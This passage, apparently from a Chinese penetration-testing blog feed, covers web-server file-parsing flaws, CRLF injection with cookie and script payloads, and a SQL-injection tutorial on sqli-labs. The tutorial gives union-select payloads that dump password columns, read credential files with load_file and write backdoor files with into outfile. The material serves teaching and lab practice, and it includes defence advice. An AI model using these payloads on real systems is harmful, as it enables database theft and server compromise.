title="IIS6.0文件解析漏洞"></a>IIS6.0文件解析漏洞</h2><ol><li>IIS除了可以解析.asp后缀的脚本以外，<strong>还可以解析.cer和.asa后缀的文件</strong>。</li><li>特殊符号“&#x2F;”，任意文件夹名.asp目录下的任何文件都会被IIS当作asp脚本执行</li><li>特殊符号“;”，任意文件名.asp;.jpg，后缀是.jpg，可以绕过限制，但是IIS6.0的特殊符号“;”会将该文件当作asp脚本执行<br>IIS7.5文件解析漏洞<br>任意文件名&#x2F;任意文件名.php，解析为php脚本文件。</li></ol><h2 id="Apache解析漏洞"><a href="#Apache解析漏洞" class="headerlink" title="Apache解析漏洞"></a>Apache解析漏洞</h2><h3 id="Apache-httpd-多后缀解析漏洞"><a href="#Apache-httpd-多后缀解析漏洞" class="headerlink" title="Apache httpd 多后缀解析漏洞"></a>Apache httpd 多后缀解析漏洞</h3><p>主要是因为Apache默认一个文件可以有多个用.分割得后缀，当最右边的后缀无法识别（mime.types文件中的为合法后缀）则继续向左看，直到碰到合法后缀才进行解析（以最后一个合法后缀为准）</p><h3 id="Apache换行解析漏洞（CVE-2017-15715）"><a href="#Apache换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache换行解析漏洞（CVE-2017-15715）"></a>Apache换行解析漏洞（CVE-2017-15715）</h3><p>影响范围：2.4.0-2.4.29版本</p><p>原因：合法后缀配置文件中的正则表达式中$不仅匹配字符串结尾位置，还可以匹配\n或\r，在解析php时，1.php\x0A将按照.php进行解析，而’.php\x0A’ !&#x3D; ‘.php’,可能过滤时过滤了.php但没有过滤.php\x0A从而实现绕过。</p><h2 id="Nginx解析漏洞"><a href="#Nginx解析漏洞" class="headerlink" title="Nginx解析漏洞"></a>Nginx解析漏洞</h2><p>任意文件名&#x2F;任意文件名.php，解析为php脚本文件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;文件上传&quot;&gt;&lt;a href=&quot;#文件上传&quot; class=&quot;headerlink&quot; title=&quot;文件上传&quot;&gt;&lt;/a&gt;文件上传&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>CRLF注入漏洞（反弹型XSS）</title>
    <link href="https://frankcao3.github.io/posts/12746"/>
    <id>https://frankcao3.github.io/posts/12746</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T12:00:37.218Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CRLF-注入漏洞"><a href="#CRLF-注入漏洞" class="headerlink" title="CRLF 注入漏洞"></a>CRLF 注入漏洞</h1><p>参考：<a href="https://blog.csdn.net/weixin_44431280/article/details/122869484">https://blog.csdn.net/weixin_44431280/article/details/122869484</a></p><h2 id="CRLF-简介"><a href="#CRLF-简介" class="headerlink" title="CRLF 简介"></a>CRLF 简介</h2><p><strong>CRLF</strong> 指的就是<strong>回车符</strong>（CR，ASCII-13，<code>\r</code>，<code>%0d</code>）和<strong>换行符</strong>（LF，ASCII-10，<code>\n</code>，<code>%0a</code>）</p><p>即<code>%0d%0a</code>。</p><p>操作系统就是通过这个标识进行换行的，相当于我们键盘的回车键。</p><p><strong>HTTP协议中的CRLF</strong>：</p><p>在HTTP协议报文中，请求行与请求头通过一个CRLF（\r\n）隔开，<u><strong>请求头</strong>（header）和<strong>请求正文</strong>（body）之间通过两个CRLF（\r\n）隔开</u>，如下图：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811170742129.png" alt="image-20220811170742129"></p><p>所以，一旦我们通过URL能够控制HTTP 消息头（请求行）中的字符，注入一些恶意的换行，这样我们就能<strong>构造恶意的请求行或请求正文</strong>，注入一些会话Cookie或者HTML代码。所以CRLF Injection又称为<strong>HTTP响应拆分漏洞</strong>HTTP Response Splitting，简称HRS。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="Cookie会话固定"><a href="#Cookie会话固定" class="headerlink" title="Cookie会话固定"></a>Cookie会话固定</h3><p>在URL参数中构造<code>%0d%0aSet-Cookie:crlf=ture</code></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811171140761.png" alt="image-20220811171140761"></p><p>查看HTTP响应包，可以发现HTTP响应头存在了<code>Set-Cookie:crlf=true</code>。因为加入了一个CRLF，所以URL中的一部分内容被作为请求头解析，而$_GET变量接受的URL会直接作为响应头中的Location字段返回。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811171158328.png" alt="image-20220811171158328"></p><h3 id="反射型XSS攻击"><a href="#反射型XSS攻击" class="headerlink" title="反射型XSS攻击"></a>反射型XSS攻击</h3><p>如果此时我们在URL中加入<code>%0d%0aSet-Cookie:%20de=a%0d%0a%0d%0a&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;</code>，那么服务端返回界面将会如下图：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220811172139448.png" alt="image-20220811172139448"></p><p>因为添加了两个CRLF的情况，JS脚本会被识别为HTTP响应正文被浏览器执行，那么就会产生反射性XSS攻击.</p><h2 id="CRLF注入漏洞防护建议"><a href="#CRLF注入漏洞防护建议" class="headerlink" title="CRLF注入漏洞防护建议"></a>CRLF注入漏洞防护建议</h2><ul><li><p>服务端前增加WAF进行防护</p></li><li><p>对用户的数据进行合法性校验，对特殊的字符进行编码，如 &lt;、&gt;、’、”、CR、LF 等，限制用户输入的 CR 和 LF，或者对 CR 和 LF 字符正确编码后再输出，以防止注入自定义 HTTP 头避免输入的数据污染其他 HTTP 首部字段。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CRLF-注入漏洞&quot;&gt;&lt;a href=&quot;#CRLF-注入漏洞&quot; class=&quot;headerlink&quot; title=&quot;CRLF 注入漏洞&quot;&gt;&lt;/a&gt;CRLF 注入漏洞&lt;/h1&gt;&lt;p&gt;参考：&lt;a href=&quot;https://blog.csdn.net/weixin_4</summary>
      
    
    
    
    
    <category term="渗透测试" scheme="https://frankcao3.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入</title>
    <link href="https://frankcao3.github.io/posts/26401"/>
    <id>https://frankcao3.github.io/posts/26401</id>
    <published>2022-08-04T16:00:00.000Z</published>
    <updated>2023-10-05T11:58:37.395Z</updated>
    
    <content type="html"><![CDATA[<h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2476579/1623750701440-910fbead-ad66-48bf-bf97-eb5f58f83565.png?x-oss-process=image/resize,w_937,limit_0" alt="SQL注入-小迪安全.png"></p><h2 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h2><p>SQL注入是一种将SQL代码插入或添加到应用（用户）的<u>输入参数</u>中的攻击，之后再将这些参数<u>传递给后台的sql服务器加以解析和执行</u>。</p><p>sql注入的方式主要是直接将代码插入参数中，这些参数会被置入sql命令中加以执行。间接的攻击方式是将恶意代码插入字符串中，之后将这些字符串保存到数据库的数据表中或将其当成元数据。当将存储的字符串置入动态sql命令中时，恶意代码就将被执行。</p><p>如果web应用未对动态构造的sql语句使用的参数进行正确性审查（即便使用了参数化技术），攻击者就很可能会修改后台sql语句的构造。如果攻击者能够修改sql语句，那么该语句将与应用的用户具有相同的权限。</p><h2 id="2-产生过程"><a href="#2-产生过程" class="headerlink" title="2. 产生过程"></a>2. 产生过程</h2><p>大多数的web应用都需要与数据库进行交互，并且大多数web应用编程语言（如ASP、C##、.NET、Java和PHP）均<u>提供了可编程的方法来与数据库连接并进行交互</u>。</p><p>如果web应用开发人员无法确保在<u>将从web表单，cookie及输入参数等收到的值传递给sql查询</u>（该查询在数据库服务器上执行）之前已经对其进行过验证，那么通常会出现sql注入漏洞，如果攻击者能够控制发送给sql查询的输入，并且能够<u>操纵该输入将其解析为代码而非数据，那么攻击者就很有可能有能力在后台数据库执行该代码。</u></p><h2 id="3-常见原因"><a href="#3-常见原因" class="headerlink" title="3. 常见原因"></a>3. 常见原因</h2><p>①转义字符处理不合适；</p><p>②不安全的数据库配置；</p><p>③不合理的查询集处理；</p><p>④不当的错误处理；</p><p>⑤多个提交处理不当。 </p><h3 id="不当的处理类型"><a href="#不当的处理类型" class="headerlink" title="不当的处理类型"></a>不当的处理类型</h3><p>sql数据库将<strong>单引号字符（’）解析成代码与数据间的分界线</strong>：单引号外面的内容均是需要运行的代码，而用单引号引起来的内容均是数据。因为只需要简单的在URL或WEB页面的字段中输入一个单引号，就能很快速的识别出web站点是否会受到sql注入攻击。 </p><h3 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h3><p>数据库带有很多默认的用户预安装内容，比如默认账户名、默认表名等，这些可能会成为SQL注入访问数据库的首要尝试。</p><p>SQL Server使用声名狼藉的“sa”作为数据库系统管理员账户，MySQL使用“root”和“anonymous”用户账户，Oracle则在创建数据库时通常会创建SYS、SYSTEM、DBSNMP和OUTLN账户。这些并非是全部的账号，只是比较出名的账户中的一部分，还有很多其他的账户。其他账户同样按默认方式进行预设，口令总所周知。</p><p>攻击者利用sql注入漏洞时，通常会<u>尝试访问数据库的元数据</u>，比如<u>内部的数据库和表的名称、列的数据类型和访问权限</u>，例如MySQL服务器的元数据位于<code>information_schema</code>虚拟数据库中，可通过<code>show databases</code>和<code>show tables</code>命令访问。所有的MySQL用户均有权限访问该数据库中的表，但只能查看表中那些与该用户访问权限相对应的对象的行。</p><h3 id="不合理的查询集处理"><a href="#不合理的查询集处理" class="headerlink" title="不合理的查询集处理"></a>不合理的查询集处理</h3><p>有时需要使用动态的sql语句对某些复杂的应用进行编码，因为程序开发阶段可能还不知道要查询的表或字段（或者不存在）。比如与大型数据库交互的应用，这些数据库在定期创建的表中的数据由于应用已经产生了输入，因而开发人员会信任该数据，<u>攻击者可以使用自己的表和字段数据来替换应用产生的值，从而影响系统的返回值</u>。</p><h3 id="不当的错误处理（盲注）"><a href="#不当的错误处理（盲注）" class="headerlink" title="不当的错误处理（盲注）"></a>不当的错误处理（盲注）</h3><p>错误处理不当会为web站点带来很多安全方面的问题。最常见的问题是<u>将详细的内部错误消息（如错误代码，数据库转存储）显示给用户或攻击</u>。这些错误消息会泄露实现细节，为攻击者提供与网站潜在缺陷相关的重要线索。 </p><h3 id="多个提交处理不当"><a href="#多个提交处理不当" class="headerlink" title="多个提交处理不当"></a>多个提交处理不当</h3><p>大型的web开发项目会出现这样的问题：有些开发人员会对输入进行验证，而一些开发人员则不以为然。对于开发人员，团队，甚至公司来说，彼此独立工作的情形并不少见，很难保证项目中每个人都遵循相同的标准。开发人员还倾向于围绕用户来设计应用，他们尽可能的使用预期的处理流程来引导用户，认为用户将遵循他们已经设计好的逻辑顺序。</p><p>例如：当用户已到达一系列表单中的第三个表单时，他们会期望用户肯定已经完成第一个和第二个表达。但实际上，借助URL乱序来请求资源，能够非常容易的避开预期的数据流程。 </p><h2 id="4-危害"><a href="#4-危害" class="headerlink" title="4. 危害"></a>4. 危害</h2><p>盗取网站的数据库敏感信息</p><p>绕过网站后台认证（万能密码：<code>‘ or ‘1’=‘1’ #</code> 登录绕过）</p><p>借助SQL注入漏洞提权获取系统权限</p><p>上传或读取文件</p><p>执行系统命令</p><h2 id="5-MySQL注入流程"><a href="#5-MySQL注入流程" class="headerlink" title="5. MySQL注入流程"></a>5. MySQL注入流程</h2><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142843140.png" alt="image.png"></p><p>以sqli-labs为例：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/1623816863968-03b39520-736a-4953-9193-393137069010.png" alt="image.png"></p><ul><li><p>查看源码，分析注入原理：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure><p>在上面的代码中可以看到，网页以get请求获得id变量的值，然后将变量id拼接到数据库查询语句，进行数据库操作：<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>直接传递的变量$id带入sql语句中执行没有做任何的限制。</p></li></ul><h3 id="判断注入点以及注入类型"><a href="#判断注入点以及注入类型" class="headerlink" title="判断注入点以及注入类型"></a>判断注入点以及注入类型</h3><p>在给id赋值时加上其他无意义的字符<code>id=1abc</code>或者<code>id=1 and 1=1</code>、<code>id=1 and 1=2</code>，或者更换闭合条件为单引号<code>1&#39; and 1=1#</code>、 <code>1&#39; and 1=2#</code>之类的字符串，如果网站在不同输入下能回显出不同页面（显示1的结果（解析了and 1&#x3D;1）或者回显为空（解析了and 1&#x3D;2）），证明有SQL注入漏洞。如果网站显示404或者500之类的错误或其他报错，说明网站进行了字符过滤之类的操作，没有SQL注入漏洞。</p><p>闭合条件根据SQL语句的结构不同而不同，数字型就没有闭合，字符型就是单引号或双引号，再次基础上还有可能跟一个或多个括号。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=1 LIMIT 0,1 </span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=1 LIMIT 0,1  # 页面回显，正常输出</span><br><span class="line">SELECT * FROM users WHERE id=1 and 1=2 LIMIT 0,1  # 页面回显，提示错误 </span><br></pre></td></tr></table></figure><h3 id="信息收集（高版本数据库）"><a href="#信息收集（高版本数据库）" class="headerlink" title="信息收集（高版本数据库）"></a>信息收集（高版本数据库）</h3><p><strong>必要知识点:</strong></p><p><em>在<strong>MYSQL5.0以上版本</strong>中，mysql存在一个自带数据库，名为<code>information_ schema</code>，它是一个存储记录有所有数据库名，表名，列名的数据库，也相当于可以通过查询它获取指定数据库下面的表名或列名信息。数据库中符号”.”代表下一级，比如xiao.user代表数据库xiao中的表user。因此：</em></p><p><code>information_ schema.tables</code>：记录所有表名信息的表</p><p><code>information_ schema.columns</code>：记录所有列名信息的表</p><p><code>table_schema</code>：数据库名</p><p><code>tables_name</code>：表名</p><p><code>column_name</code>：列名</p><p>performance_schema 用于性能分析，而 information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等。information_schema 中的表实际上是视图，而不是基本表，因此，文件系统上没有与之相关的文件。</p><h4 id="猜解数据库列数（字段数）"><a href="#猜解数据库列数（字段数）" class="headerlink" title="猜解数据库列数（字段数）"></a>猜解数据库列数（字段数）</h4><p>使用<code>order by</code>判断列数。oder by 用于指定查询结果按照第几列进行排序，若所指定的列号超出数据库表原本的列数，就会报错。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=1 order by 5</span><br></pre></td></tr></table></figure><p>以下结果中，order by 4有回显，order by 5就出现报错了，说明列的数量为4。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/b292dcde41c4abdc906e588bcbd1d9f974c684b0.png@831w_161h_progressive.webp" alt="img"></p><p><img src="https://i0.hdslb.com/bfs/article/f318d092797ad93d870e6043a4349e3383507bac.png@831w_141h_progressive.webp" alt="img"></p><h4 id="判断前端回显"><a href="#判断前端回显" class="headerlink" title="判断前端回显"></a>判断前端回显</h4><p>判断select的哪几个位置会被前端回显，后续查询就在该位置进行。<strong>其中令id为-1就可以使union前的语句为假，从而只显示union后面语句的执行结果。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,2,3</span><br></pre></td></tr></table></figure><p>结果显示2，3的位置会被前端回显。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726142202091.png" alt="image-20220726142202091"></p><h4 id="查询数据库版本"><a href="#查询数据库版本" class="headerlink" title="查询数据库版本"></a>查询数据库版本</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select version()</span><br></pre></td></tr></table></figure><h4 id="查询数据库名称"><a href="#查询数据库名称" class="headerlink" title="查询数据库名称"></a>查询数据库名称</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select database()</span><br></pre></td></tr></table></figure><h4 id="查询数据库用户"><a href="#查询数据库用户" class="headerlink" title="查询数据库用户"></a>查询数据库用户</h4><p>若是root用户，则方便执行进一步的攻击行为，如利用SQL上传文件，redis未授权漏洞写入计划任务的利用方式也是需要root权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select user()</span><br></pre></td></tr></table></figure><h4 id="查询操作系统"><a href="#查询操作系统" class="headerlink" title="查询操作系统"></a>查询操作系统</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select @@version_compile_os</span><br></pre></td></tr></table></figure><p>比如注入时，发现第2、3个位置会回显，在这个2个位置查询用户和操作系统：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.102.130:8888/Less-2/index.php?id=-1 union select 1,user(),@@version_compile_os,4</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726112454906.png" alt="image-20220726112454906"></p><p>以及数据库名称和版本名称：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,database(),version(),4</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726143807180.png" alt="image-20220726143807180"></p><h4 id="查询指定数据库下的表名信息"><a href="#查询指定数据库下的表名信息" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><p>根据刚才的信息收集，已知当前页面所操作的数据库名为mozhe_ Discuz_ stormGroup，或者直接使用database()表示，然后可以借助<code>information_ schema.tables</code>查询该数据库的所有表名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145018620.png" alt="image-20220726145018620"></p><p>得到表名之后要确定哪一个表存储着用户数据，可以根据表名猜测或是逐表查看字段。</p><h4 id="查询指定表名下的列名"><a href="#查询指定表名下的列名" class="headerlink" title="查询指定表名下的列名"></a>查询指定表名下的列名</h4><p>根据刚才收集的表名StormGroup_member，查询该表的所有列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name= &#x27;StormGroup_member&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145307736.png" alt="image-20220726145307736"></p><h4 id="查询指定数据"><a href="#查询指定数据" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><p>根据刚才收集的表名、列名，可以查询该表的指定数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,name,password,4 from StormGroup_member</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145504487.png" alt="image-20220726145504487"></p><p>指定数据可能有多个结果，可以使用<code>limit x,1</code>（从x的位置读取1条记录），变动猜解，得到不同结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://219.153.49.228:48354/new_list.php?id=-1 union select 1,name,password,4 from StormGroup_member limit 2,1</span><br></pre></td></tr></table></figure><p>得到的密码一般为MD5，去cmd5.com碰撞一下。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726145823634.png" alt="image-20220726145823634"></p><h3 id="跨库查询"><a href="#跨库查询" class="headerlink" title="跨库查询"></a>跨库查询</h3><p>MYSQL 注入中首先要明确<strong>当前注入点权限</strong>（取决于注入点所使用的数据库用户的权限，使用user()语句查询），高权限注入时有更多的攻击手法，有的能直接进行 getshell 操作。 </p><p>比如上述注入中借助的是root账户的权限进行数据库操作，若root用户具有当前数据库之外的操作权限，那么就可以注入其他数据库获取想要的信息。</p><p>imformation_schema除了记录有所有的表名、列名，还有所有的数据库名：</p><p><code>imformation_schema.schemata</code>：记录所有数据库名信息的表（跨库），其中字段<code>schema_name</code>表示数据库名。</p><p><strong>查询的前提是用户具有相应的权限。</strong></p><h4 id="查询所有的数据库名"><a href="#查询所有的数据库名" class="headerlink" title="查询所有的数据库名"></a>查询所有的数据库名</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155012588.png" alt="image-20220726155012588"></p><h4 id="查询指定数据库下的表名信息-1"><a href="#查询指定数据库下的表名信息-1" class="headerlink" title="查询指定数据库下的表名信息"></a>查询指定数据库下的表名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;qqyw&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155117482.png" alt="image-20220726155117482"></p><h4 id="查询指定表名下的列名信息"><a href="#查询指定表名下的列名信息" class="headerlink" title="查询指定表名下的列名信息"></a>查询指定表名下的列名信息</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;admin&#x27; and table_schema=&#x27;qqyw&#x27; limit 0,1   # 当出现多个记录时，可以使用limit 0,1取第一个记录</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726155734752.png" alt="image-20220726155734752"></p><h4 id="查询指定数据-1"><a href="#查询指定数据-1" class="headerlink" title="查询指定数据"></a>查询指定数据</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,u,p,4 from qqyw.admin    # 查询u,p两列的数据，注意指定admin来自qqyw</span><br></pre></td></tr></table></figure><h3 id="信息收集（低版本数据库）"><a href="#信息收集（低版本数据库）" class="headerlink" title="信息收集（低版本数据库）"></a>信息收集（低版本数据库）</h3><p>暴力查询或结合读取查询</p><ul><li>SQLmap工具——字典dicts.py</li><li>load_file读取源代码的数据库查询语句</li><li>暴力猜解——admin，password，passwd，user，member</li></ul><h3 id="x3D-x3D-文件读写操作-x3D-x3D"><a href="#x3D-x3D-文件读写操作-x3D-x3D" class="headerlink" title="&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;"></a>&#x3D;&#x3D;文件读写操作&#x3D;&#x3D;</h3><ul><li><p>**load_file()**：读取函数，读取文件内容</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160705262.png" alt="image-20220726160705262"></p><p>常见的load_file()读取的敏感信息路径：<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1 union select 1,loadfile(&#x27;d:/www.txt&#x27;),3</span><br><span class="line">id=-1 union select 1,load_file(&#x27;C:/phpstudy/PHPTutorial/WWW/sqli-labs-master/sql-connections/db-creds.inc&#x27;),3</span><br></pre></td></tr></table></figure><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162851222.png" alt="image-20220726162851222"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163415752.png" alt="image-20220726163415752"></p></li><li><p><strong>into outfile</strong> 或 <strong>into dumpfile</strong> ：上传文件（写入后门、木马）</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726160842023.png" alt="image-20220726160842023"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,&#x27;x&#x27;,3 into outfile &#x27;C:\\phpstudy\\PHPTutorial\\WWW\\sqli-labs-master\\x.php&#x27;--+</span><br></pre></td></tr></table></figure><p>其中–+用于注释后面的语句，后面有limit 0,1。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726163809879.png" alt="image-20220726163809879"></p></li></ul><h4 id="文件路径获取"><a href="#文件路径获取" class="headerlink" title="文件路径获取"></a>文件路径获取</h4><p>文件的读写都需要获取到文件路径，路径获取常见方法包括：</p><p><strong>报错显示</strong>：网站报错时，显示的一些路径信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161419446.png" alt="image-20220726161419446"></p><p><strong>遗留文件</strong>：站长调试网站时遗留的一些文件，比如phpinfo.php。通过该文件可以得到路径信息。</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161626302.png" alt="image-20220726161626302"></p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161656508.png" alt="image-20220726161656508"></p><p><strong>报错信息的漏洞</strong>：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726161808375.png" alt="image-20220726161808375"></p><p><strong>平台配置文件</strong>（不实用）：</p><p>比如在phpStudy中，配置文件C:\phpstudy\PHPTutorial\Apache\conf\vhosts.conf中保存了网站的绝对路径，缺点是配置文件的路径并不固定。<br><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162129913.png" alt="image-20220726162129913"></p><p><strong>爆破</strong>：</p><p>PhpMyAdmin、phpcms等会有惯用的一些路径，可以进行路径爆破：</p><p><img src="https://frankcao3-picgo.oss-cn-shenzhen.aliyuncs.com/img/image-20220726162408932.png" alt="image-20220726162408932"></p><h4 id="读写问题：魔术引号开关"><a href="#读写问题：魔术引号开关" class="headerlink" title="读写问题：魔术引号开关"></a>读写问题：魔术引号开关</h4><ul><li><p>概念</p><p>魔术引号设计的初衷是为了让从数据库或文件中读取数据和从请求中接收参数时，<u>对单引号、双引号、反斜线、NULL加上一个反斜线进行转义</u>，这个的作用跟addslashes()的作用完全相同。addslashes()函数返回在预定义字符之前添加反斜杠的字符串。</p><p>在phpstudy中，该开关为参数magic_quotes_gpc，在php.ini的990行左右。</p><p>其实由于不是所有数据都需要转义，出于性能的考虑，魔术引号开关在PHP5.4.0及其之后PHP版本中被取消了，在运行时调用转义函数（如 addslashes()）会更有效率。</p><img src="/posts/Users/cbcao/AppData/Roaming/Typora/typora-user-images/image-20220726165029504.png" 